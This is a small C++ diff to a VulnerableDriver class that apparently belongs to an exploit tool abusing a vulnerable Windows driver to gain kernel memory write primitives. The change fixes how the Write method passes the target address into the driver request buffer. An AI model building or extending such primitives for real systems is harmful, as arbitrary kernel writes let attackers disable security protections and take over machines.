@@ -40,7 +40,7 @@ void VulnerableDriver::Read(UINT64* iDestinationAddr, UINT64 iTargetAddr, UINT64
 
 
 
-void VulnerableDriver::Write(BYTE* iDestinationAddr, UINT64 data) {
+void VulnerableDriver::Write(UINT64 iDestinationAddr, UINT64 data) {
 	
 	if (!primitivesEnabled) {
 		std::cout << " [-] Primitives not enabled yet!" << std::endl;
@@ -53,7 +53,7 @@ void VulnerableDriver::Write(BYTE* iDestinationAddr, UINT64 data) {
 
 
 	*((UINT64*)buffer) = 0x8;
-	*((UINT64*)(buffer + sizeof(UINT64))) = *(UINT64*)iDestinationAddr;
+	*((UINT64*)(buffer + sizeof(UINT64))) = iDestinationAddr;
 
 
 	memcpy(buffer + sizeof(UINT64) * 2, &data, 0x8);
